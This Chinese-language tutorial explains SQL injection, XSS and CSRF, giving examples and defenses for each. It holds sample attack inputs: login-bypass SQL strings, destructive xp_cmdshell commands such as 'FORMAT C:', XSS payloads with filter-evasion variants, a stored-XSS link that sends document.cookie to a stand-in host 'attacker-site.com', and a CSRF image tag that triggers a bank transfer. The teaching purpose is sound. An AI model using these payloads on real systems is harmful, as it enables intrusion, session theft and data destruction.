# SQL注入

​        SQL攻击（SQL  injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。

## 原因

 在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：

1. 在应用程序中使用字符串联结方式组合SQL指令。
2. 在应用程序链接数据库时使用权限过大的账户（例如很多开发人员都喜欢用sa（内置的最高权限的系统管理员账户）连接Microsoft SQL Server数据库）。
3. 在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）
4. 太过于信任用户所输入的数据，未限制输入的字元数，以及未对用户输入的数据做潜在指令的检查。

## 作用原理

1. SQL命令可查询、插入、更新、删除等，命令的串接。而以分号字元为不同命令的区别。（原本的作用是用于SubQuery或作为查询、插入、更新、删除……等的条件式）
2. SQL命令对于传入的字符串参数是用单引号字元所包起来。（但连续2个单引号字元，在SQL资料库中，则视为字串中的一个单引号字元）
3. SQL命令中，可以注入注解（连续2个减号字元 – 后的文字为注解，或“/*”与“*/”所包起来的文字为注解）

​        因此，如果在组合SQL的命令字符串时，未针对单引号字元作取代处理的话，将导致该字元变数在填入命令字符串时，被恶意窜改原本的SQL语法的作用。

## 举例

某个网站的登录验证的SQL查询代码为

```java
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
12
```

恶意填入

```java
userName = "'1' OR '1'='1'";
12
```

与

```java
passWord = "'1' OR '1'='1'";
12
```

时，将导致原本的SQL字符串被填为

```java
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
12
```

也就是实际上运行的SQL命令会变成下面这样的

```java
strSQL = "SELECT * FROM users;"
12
```

​        因此达到无账号密码，亦可登录网站。所以SQL注入攻击被俗称为黑客的填空游戏。

## 可能造成的伤害

1. 数据表中的数据外泄，例如个人机密数据，账户数据，密码等。
2. 数据结构被黑客探知，得以做进一步攻击（例如SELECT * FROM sys.tables）。
3. 数据库服务器被攻击，系统管理员账户被窜改（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。
4. 获取系统较高权限后，有可能得以在网页加入恶意链接以及XSS。
5. 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。
6. 破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。

## 防范

1. 在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。
2. 在组合SQL字符串时，先针对所传入的参数作字元取代（将单引号字元取代为连续2个单引号字元）。
3. 如果使用PHP开发网页程序的话，亦可打开PHP的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字元取代为连续2个单引号字元）。
4. 其他，使用其他更安全的方式连接SQL数据库。例如已修正过SQL注入问题的数据库连接组件，例如ASP.NET的SqlDataSource对象或是 LINQ to SQL。
5. 使用SQL防注入系统。

------

# XSS攻击

​        xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。

xss攻击可以分成两种类型：

1. 非持久型攻击
2. 持久型攻击

### 非持久型xss攻击

​        顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。

假设有以下index.php页面：

```php
<?php
$name = $_GET['name'];
echo "Welcome $name<br>";
echo "<a href="http://www.cnblogs.com/bangerlee/">Click to Download</a>";
?>
```

该页面显示两行信息：

- 从URI获取 ‘name’ 参数，并在页面显示
- 显示跳转到一条URL的链接

这时，当攻击者给出以下URL链接：

```php
index.php?name=guest<script>alert('attacked')</script>

```

当用户点击该链接时，将产生以下html代码，带’attacked’的告警提示框弹出：

```php
Welcome guest
<script>alert('attacked')</script>
<br>
<a href='http://www.cnblogs.com/bangerlee/'>Click to Download</a>

```

除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：

```php
index.php?name=
<script>
window.onload = function() {
var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}
</script>
```

当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：

```php
Welcome 
<script>
window.onload = function() {
var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}
</script>
<br>
<a href='http://www.cnblogs.com/bangerlee/'>Click to Download</a>
```

用户再点击 “Click to Download” 时，将跳转至攻击者提供的链接。

对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更：

```php
index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e
```

### 持久型xss攻击

持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。

#### session背景知识

​        我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。

​        这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session  ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session  ID作为会话标识，游览器后续的请求均基于该session ID。

​        攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。

#### 举例

​        首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：

```php
<a href=# onclick=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\">bangerlee</a>
```

​        攻击者提交了条带<a>标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含  “bangerlee” 的用户列表将显示，如果 admin 用户点击 “bangerlee” 时，在 “attacker-site.com”  所在的服务器上，攻击者就可以窃取到 admin 的session-id：

```php
xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3
```

​        有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。

​        当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。

## 防范

#### 基于特征的防御

​        XSS漏洞和著名的SQL注入漏洞一样，都是利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。

​        传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“javascript”这个关键字进行检索，一旦发现提交信息中包含“javascript”，就认定为XSS攻击。这种检测方法的缺陷显而易见：骇客可以通过插入字符或完全编码的方式躲避检测：

1. 在javascript中加入多个tab键，得到 
    `< IMG SRC="jav ascript:alert('XSS');" >;`
2. 在javascript中加入(空格)字符，得到 
    `< IMG SRC="javascri pt:alert('XSS');" >;`
3. 在javascript中加入(回车)字符，得到

```
< IMG SRC="jav  ascript:alert('XSS');" >;` 
 \4. 在javascript中的每个字符间加入回车换行符，得到 
 `< IMG SRC="javascrip\r  \nt:alert('XSS');" >` 
 \5. 对”javascript:alert(‘XSS’)”采用完全编码，得到 
 `< IMGSRC=javascrip?74:alert('XSS') >
```

​        上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的 
 还存在大量的误报可能：在上面的例子中，对上述某网站这样一个地址，由于包含了关键字“javascript”，也将会触发报警。

#### 基于代码修改的防御

​        和SQL注入防御一样，XSS攻击也是利用了Web页面的编写疏忽，所以还有一种方法就是从Web应用开发的角度来避免：

1. 对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。
2. 实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行。
3. 确认接收的的内容被妥善的规范化，仅包含最小的、安全的Tag(没有javascript)，去掉任何对远程内容的引用(尤其是样式表和javascript)，使用HTTP only的cookie。

​        当然，如上操作将会降低Web业务系统的可用性，用户仅能输入少量的制定字符，人与系统间的交互被降到极致，仅适用于信息发布型站点。并且考虑到很少有Web编码人员受过正规的安全培训，很难做到完全避免页面中的XSS漏洞。

------

# CSRF攻击

​        CSRF（Cross-site request forgery跨站请求伪造，也被称为“one click  attack”或者session  riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。

## CSRF攻击原理

CSRF攻击原理比较简单，假设Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。

1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 
    2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
2. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
3. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
4. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

## 举例

​        银行网站A，它以GET请求来完成银行转账的操作，如： 
 `http://www.mybank.com/Transfer.php?toBankId=11&money=1000`

​        危险网站B，它里面有一段HTML的代码如下：

<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>

​        首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块……

​        为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的`<img>`以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作……

## 防范

### 检查Referer字段

​        HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。

​        这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。

### 添加校验token

​        由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。